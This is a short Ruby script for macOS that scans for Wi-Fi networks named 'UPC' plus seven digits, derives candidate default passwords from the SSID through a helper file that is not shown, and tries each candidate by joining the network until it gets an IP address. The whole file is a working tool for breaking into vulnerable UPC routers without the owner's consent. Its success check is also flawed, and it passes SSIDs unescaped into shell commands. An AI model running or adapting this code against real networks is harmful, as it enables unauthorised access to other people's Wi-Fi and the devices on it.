require 'optparse'
require_relative 'upc_keys.rb'

def scan interface
  ssids = `/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport scan | awk '{ print $1; }' 2> /dev/null`.split("\n")
  ssids.select{ |i| i[/^UPC\d{7}$/] }
end

def crack interface, ssid
  passwords = predict_passwords ssid[3,10].to_i

  passwords.each do |password|
    print "  #{password}: "
    if `networksetup -setairportnetwork #{interface} "#{ssid}" "#{password}"`.empty?
      sleep(5)
      if `/sbin/ifconfig #{interface} | grep "inet " | cut -d " " -f2`
        puts 'CRACKED'
        return password
      else
        puts 'no DHCP'
      end
    else
      puts 'nope'
    end
  end
  nil
end

if $0 == __FILE__
  interface = ''
  ssids = []
  OptionParser.new do |opts|
    opts.banner = 'Usage: script.rb [options]'
    opts.on('-i', '--interface=INTERFACE', String, 'The interface on which to operate') { |v| interface = v }
    opts.on('-s', '--ssid=SSID', String, 'The SSID of the vulnerable UPC access point') { |v| ssids.push v }
  end.parse!
  raise OptionParser::MissingArgument, '--interface OR --ssid' if interface.empty? and ssids.empty?


  if ssids.empty?
    puts "Scanning the frequencies using #{interface}"
    ssids = scan interface
  end

  result = {}
  ssids.each do |ssid|
    puts "Trying keys on SSID #{ssid}"
    password = crack interface, ssid
    result[ssid] = password if password
  end

  result.each do |ssid, password|
    puts "#{ssid}: #{password}"
  end
end
